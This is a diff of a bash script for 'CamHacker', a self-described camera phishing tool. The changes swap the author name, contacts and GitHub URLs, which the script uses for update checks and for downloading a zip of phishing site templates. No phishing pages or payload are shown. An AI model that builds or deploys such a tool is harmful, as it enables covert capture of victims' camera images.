@@ -391,14 +391,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -550,14 +550,14 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[MR-ZIHAD]
-$red[Github]     ${cyan} :[https://github.com/MR-ZIHAD]
-$red[Messenger]  ${cyan} :[https://m.me/zihad.hossain36]
-$red[Email]      ${cyan} :[hossainzihad36@gmail.com]"
+$red[Author]     ${cyan} :[KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
+$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
+$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/MR-ZIHAD#My-Best-Works"
+        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -582,7 +582,7 @@ fi
 if ! [ -d sites ]; then
     mkdir sites
     netcheck
-    wget -q --show-progress "https://github.com/MR-ZIHAD/CamHacker/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
